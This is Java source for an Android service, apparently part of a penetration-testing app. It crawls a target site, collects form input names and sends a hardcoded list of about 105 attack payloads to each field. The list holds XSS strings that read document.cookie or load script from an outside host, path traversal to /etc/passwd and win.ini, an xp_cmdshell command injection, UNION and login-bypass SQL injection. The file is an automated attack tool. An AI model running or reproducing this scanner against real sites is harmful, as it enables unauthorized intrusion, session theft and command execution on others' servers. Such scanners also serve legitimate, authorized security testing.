package com.ricochet.penetest;

import android.app.IntentService;
import android.content.Intent;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.BufferedReader;
import java.io.FileReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;

/**
 * Created by user on 2016/8/14.
 */
public class XSS extends IntentService {
    public XSS() {
        super("XSS");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        String url = intent.getStringExtra("URI");
        ArrayList<String> links = new ArrayList<String>();   //store all the target links
        JsoupParseURL urlParser = new JsoupParseURL(url); //input root url without "http://" or "https://"
        urlParser.handleWork();
        ArrayList<String> urls = urlParser.getURLs();
        int linkNum = urlParser.number;
        int formNum = 0;
        int success = 0;
        int failure = 0;

        Intent intentR = new Intent("com.android.penetest.ATTACK_XSS");
        intentR.putExtra("num0", linkNum);
        intentR.putExtra("id", 60);
        sendBroadcast(intentR);
        for (String a : urls) {
            if (flag == 0) {

                try {
                    Document doc = Jsoup.connect(a).get();
                    Elements es = doc.select("input[type=text]");
                    es.addAll(doc.select("input[type=hidden]"));
                    es.addAll(doc.select("input[type=search]"));
                    if (es.isEmpty()) continue;
                    for (Element e : es) {
                        //System.out.println(a+"/?"+e.attr("name")+"=");
                        links.add(a + "/?" + e.attr("name") + "=");
                        formNum++;
                    }
                } catch (Exception e) {

                }
            } else {
                break;
            }
        }
        Intent intentRb = new Intent("com.android.penetest.ATTACK_XSS");
        intentRb.putExtra("num1", formNum);
        intentRb.putExtra("id", 61);
        sendBroadcast(intentRb);
        try {
            for (int i = 0; i < 105; i++) {
                if (flag == 0) {
                    for (String link : links) {
                        if (flag == 0) {
                            HttpURLConnection connection = (HttpURLConnection) new URL(link + codes[i]).openConnection();
                            connection.setRequestProperty("accept", "*/*");
                            connection.setRequestProperty("connection", "Keep-Alive");
                            connection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
                            connection.connect();
                            int responsecode = connection.getResponseCode();
                            if(responsecode==200)success++;else failure++;
                            Intent intentRe = new Intent("com.android.penetest.ATTACK_XSS");
                            intentRe.putExtra("re", link + codes[i]);
                            intentRe.putExtra("status", responsecode);
                            intentRe.putExtra("id", 6);
                            sendBroadcast(intentRe);
                        } else {
                            break;
                        }
                    }
                } else {
                    break;
                }
            }

        } catch (Exception e) {

        }
        Intent intentRc = new Intent("com.android.penetest.ATTACK_XSS");
        intentRc.putExtra("id", 62);
        intentRc.putExtra("success",success);
        intentRc.putExtra("failure",failure);
        sendBroadcast(intentRc);

    }

    final String[] codes = {"\'><script>alert(document.cookie)</script>",
            "=\'><script>alert(document.cookie)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>alert(vulnerable)</script>",
            "%3Cscript%3Ealert(\'XSS\')%3C/script%3E",
            "<script>alert(\'XSS\')</script>",
            "<img src=\"javascript:alert(\'XSS\')\">",
            "%0a%0a<script>alert(\"Vulnerable\")</script>.jsp",
            "%22%3cscript%3ealert(%22xss%22)%3c/script%3e",
            "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini",
            "%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e",
            "%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e",
            "%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html",
            "%3f.jsp",
            "%3f.jsp",
            "<script>alert(\'Vulnerable\');</script>",
            "<script>alert(\'Vulnerable\')</script>",
            "?sql_debug=1",
            "a%5c.aspx",
            "a.jsp/<script>alert(\'Vulnerable\')</script>",
            "a/",
            "a?<script>alert(\'Vulnerable\')</script>",
            "\"><script>alert('Vulnerable')</script>",
            "\';exec%20master..xp_cmdshell%20\'dir%20 c:%20>%20c:\\inetpub\\wwwroot\\?.txt\'--&&",
            "%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E",
            "%3Cscript%3Ealert(document. domain);%3C/script%3E&",
            "%3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=",
            "1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
            "\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system.ini",
            "\'\';!--\"<XSS>=&{()}",
            "<IMG src=\"javascript:alert(\'XSS\');\">",
            "<IMG src=javascript:alert(\'XSS\')>",
            "<IMG src=JaVaScRiPt:alert(\'XSS\')>",
            "<IMG src=JaVaScRiPt:alert(\"XSS\")>",
            "<IMG src=javascript:alert(\'XSS\')>",
            "<IMG src=javascript:alert(\'XSS\')>",
            "<IMG src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
            "<IMG src=\"jav ascript:alert(\'XSS\');\">",
            "<IMG src=\"jav ascript:alert(\'XSS\');\">",
            "<IMG src=\"jav ascript:alert(\'XSS\');\">",
            "\"<IMG src=java\\0script:alert(\"XSS\")>\";\' > out",
            "<IMG src=\" javascript:alert(\'XSS\');\">",
            "<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>",
            "<BODY BACKGROUND=\"javascript:alert(\'XSS\')\">",
            "<BODY ONLOAD=alert(\'XSS\')>",
            "<IMG DYNSRC=\"javascript:alert(\'XSS\')\">",
            "\"<IMG LOWSRC=\"javascript:alert(\'XSS\')\">",
            "<BGSOUND src=\"javascript:alert(\'XSS\');\">",
            "<br size=\"&{alert(\'XSS\')}\">",
            "<LAYER src=\"http://xss.ha.ckers.org/a.js\"></layer>",
            "<LINK REL=\"stylesheet\" href=\"javascript:alert(\'XSS\');\">",
            "<IMG src=\'vbscript:msgbox(\"XSS\")\'>",
            "<IMG src=\"mocha:[code]\">",
            "<IMG src=\"livescript:[code]\">",
            "<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(\'XSS\');\">",
            "<IFRAME src=javascript:alert(\'XSS\')></IFRAME>",
            "<FRAMESET><FRAME src=javascript:alert(\'XSS\')></FRAME></FRAMESET>",
            "<TABLE BACKGROUND=\"javascript:alert(\'XSS\')\">",
            "<DIV STYLE=\"background-image: url(javascript:alert(\'XSS\'))\">",
            "<DIV STYLE=\"behaviour: url(\'http://www.how-to-hack.org/exploit.html\');\">",
            "<DIV STYLE=\"width: expression(alert(\'XSS\'));\">",
            "<STYLE>@im\\port\'\\ja\\vasc\\ript:alert(\"XSS\")\';</STYLE>",
            "\"<IMG STYLE=\'xss:expre\\ssion(alert(\"XSS\"))\'>",
            "<STYLE TYPE=\"text/javascript\">alert(\'XSS\');</STYLE>",
            "<STYLE TYPE=\"text/css\">.XSS{background-image:url(\"javascript:alert(\'XSS\')\");}</STYLE><A class=\"XSS\"></A>",
            "<STYLE type=\"text/css\">BODY{background:url(\"javascript:alert(\'XSS\')\")}</STYLE>",
            "<BASE href=\"javascript:alert(\'XSS\');//\">",
            "getURL(\"javascript:alert(\'XSS\')\")",
            "a=\"get\";b=\"URL\";c=\"javascript:\";d=\"alert(\'XSS\');\";eval(a+b+c+d);",
            "<XML src=\"javascript:alert(\'XSS\');\">",
            "\"> <BODY ONLOAD=\"a();\"><SCRIPT>function a(){alert(\'XSS\');}</SCRIPT><\"",
            "<SCRIPT src=\"http://xss.ha.ckers.org/xss.jpg\"></SCRIPT>",
            "<IMG src=\"javascript:alert(\'XSS\')\"",
            "<!--#exec cmd=\"/bin/echo \'<SCRIPT SRC\'\"--><!--#exec cmd=\"/bin/echo \'=http://xss.ha.ckers.org/a.js></SCRIPT>\'\"-->",
            "<IMG src=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">",
            "<SCRIPT a=\">\" src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
            "<SCRIPT =\">\" src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
            "<SCRIPT a=\">\" \'\' src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
            "<SCRIPT \"a=\'>\'\" src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
            "<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT src=\"http://xss.ha.ckers.org/a.js\"></SCRIPT>",
            "<A href=http://www.gohttp://www.google.com/ogle.com/>link</A>",
            "admin\'--",
            "\' or 0=0 --",
            "\" or 0=0 --",
            "or 0=0 --",
            "\' or 0=0 #",
            "\" or 0=0 #",
            "\"or 0=0 #",
            "\' or \'x\'=\'x",
            "\" or \"x\"=\"x",
            "\') or (\'x\'=\'x",
            "\' or 1=1--",
            "\" or 1=1--",
            "or 1=1--",
            "\' or a=a--",
            "\" or \"a\"=\"a",
            "\') or (\'a\'=\'a",
            "\") or (\"a\"=\"a",
            "hi\" or \"a\"=\"a",
            "hi\" or 1=1 --",
            "hi\' or 1=1 --",
            "hi\' or \'a\'=\'a",
            "hi\') or (\'a\'=\'a",
            "hi\") or (\"a\"=\"a[/code]"};

    private int flag = 0;

    @Override
    public void onDestroy() {
        flag = 1;
        super.onDestroy();
    }
}
